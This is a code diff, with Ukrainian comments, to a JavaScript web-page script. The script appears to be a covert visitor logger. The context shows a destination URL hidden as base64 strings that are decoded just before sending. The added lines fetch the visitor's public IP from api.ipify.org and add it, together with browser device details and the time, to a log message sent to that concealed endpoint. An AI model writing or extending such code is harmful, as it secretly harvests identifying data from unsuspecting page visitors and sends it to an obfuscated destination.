@@ -57,6 +57,16 @@
         // Розшифровка відбувається безпосередньо перед відправкою
         const getUrl = () => atob(_0x1a) + atob(_0x2b);
 
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return "Не вдалося отримати IP";
+            }
+        }
+
         async function getDevice() {
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
@@ -79,7 +89,9 @@
 
         async function sendLog(statusText, emoji) {
             const deviceName = await getDevice();
+            const ipAddress = await getIP();
             const message = `${emoji} **${statusText}**\n\n` +
+                            `🌐 **IP-адреса:** ${ipAddress}\n` +
                             `📱 **Пристрій:** ${deviceName}\n` +
                             `⏰ **Час:** ${getTime()}`;
 
